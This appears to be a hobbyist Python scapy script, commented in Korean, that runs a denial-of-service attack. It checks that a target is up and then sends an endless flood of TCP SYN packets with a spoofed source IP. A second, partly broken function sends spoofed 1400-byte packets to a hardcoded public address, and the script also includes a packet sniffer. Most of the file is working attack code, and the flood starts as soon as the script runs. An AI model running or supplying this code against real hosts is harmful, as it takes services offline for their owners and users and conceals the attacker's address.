from scapy.all import IP, TCP, sr1, ICMP, send, sniff, Raw, ARP
from scapy.layers.inet import RandShort
import logging
import time
import os
import sys

logging.getLogger("scapy").setLevel(logging.CRITICAL)

def setup():
    if len(sys.argv) > 1:
        if sys.argv[1] == "--help":
            print("Please type 'sudo python main.py {{IP Address}}' to process Syn Flood Attack")
            os._exit(0)
        ip_address = sys.argv[1]
        return ip_address
    else:
        print("\033[1m\033[91m" + "Icorrect arguements for help type '--help'" + "\033[0m")
        os._exit(0)

def send_packet():
    # ICMP 패킷 생성
    packet = IP(dst="192.168.123.160")/TCP(dport=8000) 
    print(packet)
    # * IP 함수를 이용하여 도착지로 보낼 패킷을 형성
    # * ex) IP / ICMP 192.168.123.160 >  echo-request 0
    response = sr1(packet)
    print(response.src) 
    print(response.ttl) # * 패킷이 일정시간 동안 얼마나 오랫동안 살아있을 수 있는지에 대한 기록
    # * 지금 여기서 NoneType Error -> 요청한 패킷에 대하여 돌아오는 값이 존재하지 않음

destination = ['219.251.176.190']

def check_ip_alive(ip):
    packet = IP(dst=ip)/ICMP()
    response = sr1(packet, timeout=1, verbose=0)
    if response:
        return [f"IP Address {ip} is alive", 1]
    else:
        return [f"IP Address {ip} is downed", 2]

def packet_callback(packet):
    print("\033[1m\033[96m" + "Source IP: " + "\033[0m" + packet[IP].src)
    print("\033[1m\033[96m" + "Destination IP: " + "\033[0m" + packet[IP].dst)


def sniffing():
    sniff(filter="tcp and port 8000", prn=packet_callback)
    
def spooping(ip):
    count = 0
    sta = "192.168.123.50"
    des = destination[0]
    mes = "A" * 1400
    st_port = RandShort()
    de_port = 8000
    check_alive = check_ip_alive()
    if check_ip_alive == f"IP Address {ip} is alive":
        print("\033[1m\033[92m" + check_alive + "\033[0m")
        time.sleep(3)
        print("\033[1m\033[92m" + "Start Spooping" + "\033[0m")
        time.sleep(1)
        while True:
            # * Spooping IP 주소를 써드파티 서버로 전송 ->  
            packet = IP(src=sta, dst=des)/TCP(sport=st_port, dport=de_port)/mes
            detail = packet.show2(dump=True)
            st_ip = str(detail).split('\n')[11]
            des_ip = str(detail).split('\n')[12]
            print("\033[1m\033[92m" + "Source IP Address" + "\033[0m" + f" >> {str(st_ip).split('=')[1][1:]}" + "\033[1m\033[96m" + " Destination IP Address" + "\033[0m" + f" >> {str(des_ip).split('=')[1][1:]}" + "\033[1m\033[91m" + f" [{count}]...IP_SPOOPING" + "\033[0m")
            send(packet, verbose=0)
            count += 1
    elif check_ip_alive == f"IP Address {ip} is downed":
        print("\033[1m\033[91m" + check_alive + "\033[0m")
        os._exit(0)
    # * send와 sr,sr1의 차이점 -> sr과 sr1은 패킷을 송신하고, 응답을 기다리지만, send는 x

def syn_flooding(ip):
    count = 0
    sta = "192.168.123.50"
    des = ip
    st_port = RandShort()
    de_port = 80
    check_alive = check_ip_alive(ip)
    if check_alive[1] == 1:
        print("\033[1m\033[92m" + check_alive[0] + "\033[0m")
        time.sleep(3)
        print("\033[1m\033[92m" + "Syn DDOS Attack" + "\033[0m")
        time.sleep(1)
        while True:
            packet=IP(src=sta,dst=des)/TCP(flags="S",sport=st_port,dport=de_port)
            detail = packet.show2(dump=True)
            st_ip = str(detail).split('\n')[11]
            des_ip = str(detail).split('\n')[12]
            print(f"\033[1m\033[92m" + "Source IP Address" + "\033[0m" + f" >> {str(st_ip).split('=')[1][1:]}" + "\033[1m\033[96m" + " Destination IP Address" + "\033[0m" + f" >> {str(des_ip).split('=')[1][1:]}" + "\033[1m\033[91m" + f" ...IP_SPOOPING[{count}]" + "\033[0m")
            send(packet,verbose=0)
            count += 1
    elif check_alive[1] == 2:
        print("\033[1m\033[91m" + check_alive[0] + "\033[0m")
        os._exit(0)

class total:
    ip = setup()
    syn_flooding(ip)

if __name__ == "__main__":
    total

# * 결론 내 서버용 컴퓨터의 리소스는 매우 적기 때문에 바로 다운되어지지만 서버용 컴퓨터에는 영향이 미미하다.